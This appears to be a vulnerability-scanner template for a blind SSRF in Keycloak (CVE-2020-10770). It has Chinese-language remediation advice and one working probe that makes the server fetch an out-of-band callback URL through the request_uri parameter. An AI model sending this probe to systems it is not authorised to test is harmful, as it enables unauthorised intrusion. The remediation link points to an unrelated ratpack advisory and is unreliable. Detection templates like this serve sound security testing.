id: CVE-2020-10770
info:
  name: Keycloak 12.0.1 - 'request_uri ' Blind Server-Side Request Forgery (SSRF)
    (Unauthenticated)
  author:
  - dhiyaneshdk
  tags:
  - keycloak
  - ssrf
  - oast
  - cve
  - cve2020
  - blind
  description: |-
    Keycloak存在SSRF漏洞
    Red Hat Keycloak是美国红帽（Red Hat）公司的一套为现代应用和服务提供身份验证和管理功能的软件。

    Keycloak 存在代码问题漏洞，该漏洞源于在那里它可能迫使服务器使用OIDC参数请求uri调用一个未经验证的URL。这个缺陷允许攻击者可利用该漏洞使用这个参数来执行服务器端请求伪造(SSRF)攻击。
  reference:
  - https://packetstormsecurity.com/files/164499/keycloak-12.0.1-server-side-request-forgery.html
  - https://www.exploit-db.com/exploits/50405
  - https://nvd.nist.gov/vuln/detail/cve-2020-10770
  - https://bugzilla.redhat.com/show_bug.cgi?id=1846270
  severity: medium
  classification:
    cve-id:
    - cve-2020-10770
    cwe-id:
    - cwe-601
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
    cvss-score: 5.3
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    https://snyk.io/vuln/SNYK-JAVA-IORATPACK-534882

    临时修复方案：
    1、过滤内网服务器对公网服务器请求的响应。如果Web应用是获取某一类型的文件，在把返回结果展示给用户之前应先验证返回的信息是否符合文件类型标准，比如返回信息应为图片，如果返回信息是HTML，则停止将返回信息返回客户端。
    2、统一错误提示信息，避免用户可以根据错误信息来判断远端服务器的端口状态。
    3、在内网服务器的防火墙上限制公网服务器的请求端口为HTTP等协议常用端口，如：80、443、8080、8090。
    4、若公网服务器的内网IP与内网无业务通信，建议将公网服务器对应的内网IP列入黑名单，避免应用被用来获取内网数据。
    5、内网服务器禁用不必要的协议，仅允许HTTP和HTTPS请求，防止类似于file:///、gopher://、ftp:// 等协议引起的安全问题。
requests:
- matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  path:
  - '{{BaseURL}}/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://{{interactsh-url}}/'
  method: GET
